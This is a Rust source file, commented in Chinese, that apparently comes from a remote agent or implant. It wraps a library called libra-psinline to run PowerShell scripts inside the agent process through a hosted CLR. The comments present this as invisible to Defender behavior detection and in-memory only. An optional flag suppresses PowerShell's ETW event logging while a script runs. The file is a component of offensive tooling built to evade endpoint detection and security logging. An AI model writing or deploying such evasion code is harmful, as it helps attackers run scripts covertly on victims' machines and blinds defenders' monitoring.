//! PowerShell inline execution entry.
//!
//! 默认执行方式（powershell-inline）：agent 进程内托管 CLR 4 + GAC 中的
//! System.Management.Automation，无 powershell.exe 进程、无内存补丁、
//! stub 纯内存加载，对 Defender 行为检测不可见。
//!
//! 实现位于共享库 `libra-psinline`（script 模块的 powershell() 也复用它）。

use libra_psinline;

pub struct PowerShellRunner;

impl PowerShellRunner {
    /// Execute PowerShell script in-process via the hosted CLR.
    pub fn execute(script: &str, timeout_secs: u64) -> String {
        Self::execute_opts(script, timeout_secs, false)
    }

    /// Execute with options. `suppress_etw` 在执行窗口内瞬态抑制
    /// PowerShell 引擎的 ETW 事件日志（默认关闭，检测面见 libra-psinline::etw）。
    pub fn execute_opts(script: &str, timeout_secs: u64, suppress_etw: bool) -> String {
        libra_psinline::execute_inline_opts(script, timeout_secs, suppress_etw)
    }
}
